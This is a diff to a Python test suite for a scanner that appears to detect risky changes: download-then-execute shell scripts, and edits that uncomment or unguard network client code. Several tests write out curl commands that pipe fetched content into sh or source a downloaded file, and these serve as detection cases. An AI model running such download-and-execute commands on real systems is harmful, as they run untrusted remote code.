@@ -692,6 +692,40 @@ class DownloadThenExecute(ScannerTestCase):
         script = blocked(f"#!/bin/sh\ncurl -fsSL {self.URL} -o /tmp/i && ", "sh", " \\\n  /tmp/i\n")
         self.assertBlocked(self.build({}, {"packaging/l.sh": script}))
 
+    def test_pipeline_stage_before_the_interpreter(self):
+        """`| tee f | sh` pipes the same downloaded stream into the shell."""
+        script = blocked(f"#!/bin/sh\ncurl -fsSL {self.URL} | tee /tmp/log | ", "sh", "\n")
+        self.assertBlocked(self.build({}, {"packaging/t.sh": script}))
+
+    def test_sourcing_the_downloaded_file(self):
+        """`. f` and `source f` run it in the current shell."""
+        for name, spelling in (("packaging/s1.sh", "."), ("packaging/s2.sh", "source")):
+            with self.subTest(spelling):
+                script = blocked(
+                    f"#!/bin/sh\ncurl -fsSL {self.URL} -o /tmp/i && ", spelling, " /tmp/i\n"
+                )
+                self.assertBlocked(self.build({}, {name: script}))
+
+    def test_redirect_belonging_to_a_later_command_is_not_blocked(self):
+        """The curl never writes /tmp/i; printf does, after a `;`."""
+        script = (
+            "#!/bin/sh\n"
+            f"curl {self.URL}; printf 'echo ok' > /tmp/i; sh /tmp/i\n"
+        )
+        self.assertOrdinary(self.build({}, {"packaging/r.sh": script}))
+
+    def test_logical_or_is_not_a_pipeline(self):
+        script = f"#!/bin/sh\ncurl -fsSL {self.URL}/probe || sh ./fallback.sh\n"
+        self.assertOrdinary(self.build({}, {"packaging/o.sh": script}))
+
+    def test_dot_as_an_argument_is_not_sourcing(self):
+        """`jq . file` passes a dot; it does not source anything."""
+        script = (
+            "#!/bin/sh\n"
+            f"curl -s {self.URL} -o /tmp/d.json && jq . /tmp/d.json\n"
+        )
+        self.assertOrdinary(self.build({}, {"packaging/j.sh": script}))
+
     def test_executed_file_only_sharing_a_prefix_is_not_blocked(self):
         """`/tmp/data` and `/tmp/data-cleanup.sh` are different files."""
         script = (
@@ -1090,7 +1124,22 @@ class SensitiveActivation(ScannerTestCase):
         head = "class P {\n  final c = HttpClient();\n}\n"
         result = self.build({"lib/ui/panel.dart": base}, {"lib/ui/panel.dart": head})
         self.assertSensitive(result)
-        self.assertIn("deletion may activate existing", result.report)
+        self.assertIn("removed suppression may activate existing", result.report)
+
+    def test_delimiters_replaced_by_blank_lines(self):
+        """Loses no lines, so a net-count signal would miss it."""
+        base = "class P {\n/*\n  final c = HttpClient();\n*/\n}\n"
+        head = "class P {\n\n  final c = HttpClient();\n\n}\n"
+        self.assertSensitive(
+            self.build({"lib/ui/panel.dart": base}, {"lib/ui/panel.dart": head})
+        )
+
+    def test_removing_an_if_false_guard(self):
+        base = "class P {\n  void g() {\n    if (false) {\n      final c = HttpClient();\n    }\n  }\n}\n"
+        head = "class P {\n  void g() {\n      final c = HttpClient();\n  }\n}\n"
+        self.assertSensitive(
+            self.build({"lib/ui/panel.dart": base}, {"lib/ui/panel.dart": head})
+        )
 
     def test_editing_beside_sensitive_code_stays_ordinary(self):
         """The load-bearing case: 356 files hold a sensitive match.
@@ -1100,6 +1149,12 @@ class SensitiveActivation(ScannerTestCase):
         """
         base = "class W {\n  final c = HttpClient();\n}\n// tail\n"
         head = "class W {\n  final c = HttpClient();\n}\n// tail edited\n"
+        self.assertOrdinary(self.build({"lib/ui/w.dart": base}, {"lib/ui/w.dart": head}))
+
+    def test_deleting_ordinary_lines_beside_sensitive_code_stays_ordinary(self):
+        """Removing plain code is not removing a suppression."""
+        base = "class W {\n  final c = HttpClient();\n}\n// a\n// b\n"
+        head = "class W {\n  final c = HttpClient();\n}\n"
         self.assertOrdinary(self.build({"lib/ui/w.dart": base}, {"lib/ui/w.dart": head}))
 
 
